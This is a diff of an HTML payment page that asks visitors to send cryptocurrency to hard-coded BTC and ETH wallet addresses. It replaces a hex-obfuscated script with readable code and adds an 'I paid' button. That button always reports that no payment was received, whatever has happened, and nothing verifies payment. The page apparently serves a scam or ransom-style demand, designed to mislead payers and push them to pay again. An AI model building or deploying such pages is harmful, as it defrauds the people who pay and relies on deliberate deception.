@@ -1,2 +1,154 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Payment Info</title><style>body{margin:0;background-color:#b30000;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:monospace,monospace;color:white;user-select:none;padding:20px;box-sizing:border-box}.container{background-color:#330000;padding:30px 40px;border-radius:10px;text-align:center;box-shadow:0 0 20px #660000;width:90%;max-width:400px;flex-shrink:0}.address-box{background-color:#550000;border:2px solid #ff4d4d;padding:12px 20px;margin-top:20px;font-size:1.1rem;letter-spacing:1.5px;cursor:pointer;user-select:none;transition:background-color .3s ease;word-break:break-word;min-height:50px;display:flex;align-items:center;justify-content:center}.address-box:hover{background-color:#770000}.copied-msg{margin-top:15px;font-size:.9rem;color:#ff8080;height:18px;visibility:hidden;opacity:0;transition:opacity .5s ease}.copied-msg.visible{visibility:visible;opacity:1}button{margin-top:30px;padding:14px 28px;background-color:#550000;border:2px solid #ff4d4d;border-radius:8px;color:white;font-family:monospace,monospace;font-size:1.1rem;cursor:pointer;transition:background-color .3s ease;user-select:none;flex-shrink:0;max-width:400px;width:90%}button:hover{background-color:#770000}@media (max-width:480px){.container{padding:20px 25px;width:95%}.address-box{font-size:1.3rem;padding:18px 25px;min-height:70px}button{font-size:1.2rem;padding:16px 30px}}</style></head><body><div class="container" id="paymentContainer"><p id="paymentText">Send <strong>0,00019 BTC</strong> to the following address</p><div class="address-box" id="address">bc1qv9tk6g5gruuzhx4fg3wup20u4qp5ppkzk3c4jw</div><div class="copied-msg" id="copiedMsg">Address copied to clipboard!</div></div><button id="switchBtn">Pay with ETH instead</button><script>var _0xa541=["\x61\x64\x64\x72\x65\x73\x73","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74","\x77\x72\x69\x74\x65\x54\x65\x78\x74","\x63\x6C\x61\x73\x73\x4C\x69\x73\x74","\x61\x64\x64","\x72\x65\x6D\x6F\x76\x65","\x76\x69\x73\x69\x62\x6C\x65","\x76\x69\x73\x69\x62\x6C\x65","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x70\x61\x79\x6D\x65\x6E\x74\x54\x65\x78\x74","\x50\x61\x79\x20\x77\x69\x74\x68\x20\x45\x54\x48\x20\x69\x6E\x73\x74\x65\x61\x64","\x30\x78\x35\x61\x38\x37\x66\x61\x30\x63\x39\x44\x33\x33\x35\x32\x43\x30\x34\x33\x37\x31\x62\x62\x64\x65\x33\x64\x42\x31\x31\x31\x43\x31\x35\x38\x44\x36\x35\x36\x63\x42","\x50\x61\x79\x20\x77\x69\x74\x68\x20\x42\x54\x43\x20\x69\x6E\x73\x74\x65\x61\x64","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x30\x2C\x30\x30\x30\x31\x39\x20\x42\x54\x43","\x62\x63\x31\x71\x76\x39\x74\x6B\x36\x67\x35\x67\x72\x75\x75\x7A\x68\x78\x34\x66\x67\x33\x77\x75\x70\x32\x30\x75\x34\x71\x70\x35\x70\x70\x6B\x7A\x6B\x33\x63\x34\x6A\x77","\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74"];const addressBox=document[_0xa541[1]](_0xa541[0]),copiedMsg=document[_0xa541[1]]("\x63\x6F\x70\x69\x65\x64\x4D\x73\x67"),paymentText=document[_0xa541[1]](_0xa541[9]),switchBtn=document[_0xa541[1]]("\x73\x77\x69\x74\x63\x68\x42\x74\x6E");let isBTC=true;addressBox["\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72"]("\x63\x6C\x69\x63\x6B",()=>{const _0x2757x5=addressBox[_0xa541[2]];navigator[_0xa541[3]](_0x2757x5).then(()=>{copiedMsg[_0xa541[4]][_0xa541[5]]("\x76\x69\x73\x69\x62\x6C\x65");setTimeout(()=>{copiedMsg[_0xa541[4]][_0xa541[6]](_0xa541[7])},2000)}).catch(()=>{alert("\x46\x61\x69\x6C\x65\x64\x20\x74\x6F\x20\x63\x6F\x70\x79\x20\x61\x64\x64\x72\x65\x73\x73\x2E")})});switchBtn["\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72"]("\x63\x6C\x69\x63\x6B",()=>{if(isBTC){paymentText[_0xa541[8]]=`\x53\x65\x6E\x64\x20\x3C\x73\x74\x72\x6F\x6E\x67\x3E${_0xa541[10]}\x3C\x2F\x73\x74\x72\x6F\x6E\x67\x3E\x20\x74\x6F\x20\x74\x68\x65\x20\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x20\x61\x64\x64\x72\x65\x73\x73`;addressBox[_0xa541[2]]=_0xa541[11];switchBtn[_0xa541[2]]=_0xa541[12];isBTC=false}else{paymentText[_0xa541[14]]=`\x53\x65\x6E\x64\x20\x3C\x73\x74\x72\x6F\x6E\x67\x3E${_0xa541[15]}\x3C\x2F\x73\x74\x72\x6F\x6E\x67\x3E\x20\x74\x6F\x20\x74\x68\x65\x20\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x20\x61\x64\x64\x72\x65\x73\x73`;addressBox[_0xa541[16]]=_0xa541[17];switchBtn[_0xa541[2]]=_0xa541[11];isBTC=true}});
-</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Payment Info</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #b30000;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: monospace, monospace;
+      color: white;
+      user-select: none;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .container {
+      background-color: #330000;
+      padding: 30px 40px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 0 20px #660000;
+      width: 90%;
+      max-width: 400px;
+      flex-shrink: 0;
+    }
+    .address-box {
+      background-color: #550000;
+      border: 2px solid #ff4d4d;
+      padding: 12px 20px;
+      margin-top: 20px;
+      font-size: 1.1rem;
+      letter-spacing: 1.5px;
+      cursor: pointer;
+      user-select: none;
+      transition: background-color 0.3s ease;
+      word-break: break-word;
+      min-height: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .address-box:hover {
+      background-color: #770000;
+    }
+    .copied-msg, .noti-msg {
+      margin-top: 15px;
+      font-size: 0.9rem;
+      color: #ff8080;
+      height: 18px;
+      visibility: hidden;
+      opacity: 0;
+      transition: opacity 0.5s ease;
+    }
+    .copied-msg.visible,
+    .noti-msg.visible {
+      visibility: visible;
+      opacity: 1;
+    }
+    button {
+      margin-top: 20px;
+      padding: 14px 28px;
+      background-color: #550000;
+      border: 2px solid #ff4d4d;
+      border-radius: 8px;
+      color: white;
+      font-family: monospace, monospace;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      user-select: none;
+      flex-shrink: 0;
+      max-width: 400px;
+      width: 90%;
+    }
+    button:hover {
+      background-color: #770000;
+    }
+    @media (max-width: 480px) {
+      .container {
+        padding: 20px 25px;
+        width: 95%;
+      }
+      .address-box {
+        font-size: 1.3rem;
+        padding: 18px 25px;
+        min-height: 70px;
+      }
+      button {
+        font-size: 1.2rem;
+        padding: 16px 30px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="paymentContainer">
+    <p id="paymentText">Send <strong>0,00019 BTC</strong> to the following address</p>
+    <div class="address-box" id="address">bc1qv9tk6g5gruuzhx4fg3wup20u4qp5ppkzk3c4jw</div>
+    <div class="copied-msg" id="copiedMsg">Address copied to clipboard!</div>
+    <button id="paidBtn">I paid</button>
+    <div class="noti-msg" id="notiMsg">We didn't receive your payment yet. Please try again in a minute.</div>
+  </div>
+  <button id="switchBtn">Pay with ETH instead</button>
+
+  <script>
+    const addressBox = document.getElementById('address');
+    const copiedMsg = document.getElementById('copiedMsg');
+    const paymentText = document.getElementById('paymentText');
+    const switchBtn = document.getElementById('switchBtn');
+    const paidBtn = document.getElementById('paidBtn');
+    const notiMsg = document.getElementById('notiMsg');
+
+    let isBTC = true;
+
+    addressBox.addEventListener('click', () => {
+      const address = addressBox.textContent;
+      navigator.clipboard.writeText(address).then(() => {
+        copiedMsg.classList.add('visible');
+        setTimeout(() => {
+          copiedMsg.classList.remove('visible');
+        }, 2000);
+      }).catch(() => {
+        alert('Failed to copy address.');
+      });
+    });
+
+    switchBtn.addEventListener('click', () => {
+      if (isBTC) {
+        paymentText.innerHTML = 'Send <strong>0,0083 ETH</strong> to the following address';
+        addressBox.textContent = '0x5a87fa0c9D3352C04371bbde3dB111C158D656cB';
+        switchBtn.textContent = 'Pay with BTC instead';
+        isBTC = false;
+      } else {
+        paymentText.innerHTML = 'Send <strong>0,00019 BTC</strong> to the following address';
+        addressBox.textContent = 'bc1qv9tk6g5gruuzhx4fg3wup20u4qp5ppkzk3c4jw';
+        switchBtn.textContent = 'Pay with ETH instead';
+        isBTC = true;
+      }
+    });
+
+    paidBtn.addEventListener('click', () => {
+      notiMsg.classList.add('visible');
+      setTimeout(() => {
+        notiMsg.classList.remove('visible');
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
